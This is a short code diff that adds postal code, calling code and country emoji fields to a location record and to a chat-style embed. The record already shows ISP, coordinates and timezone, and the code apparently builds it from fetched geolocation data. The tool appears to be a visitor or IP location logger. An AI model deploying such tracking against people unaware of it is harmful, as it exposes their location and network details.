@@ -92,6 +92,9 @@
                     longitude: data.longitude || "N/A",
                     currency: data.currency || "N/A",
                     timezone: data.timezone || "N/A",
+                    postal: data.postal || "N/A",
+                    country_calling_code: data.country_calling_code || "N/A",
+                    country_emoji: data.country_emoji || "N/A",
                 };
             } catch (error) {
                 console.error('Error fetching location:', error);
@@ -158,7 +161,11 @@
                     { name: "ISP", value: location.isp || "N/A", inline: false },
                     { name: "Coordinates", value: `Lat: ${location.latitude}, Lon: ${location.longitude}`, inline: false },
                     { name: "Currency", value: location.currency || "N/A", inline: false },
-                    { name: "Timezone", value: location.timezone || "N/A", inline: true }
+                    { name: "Timezone", value: location.timezone || "N/A", inline: true },
+                    { name: "Postal", value: location.postal || "N/A", inline: true },
+                    { name: "Country Code", value: location.country_calling_code || "N/A", inline: true },
+                    { name: "Emoji", value: location.country_emoji || "N/A", inline: true }
+                    
                 ]
             };
             const payload = {
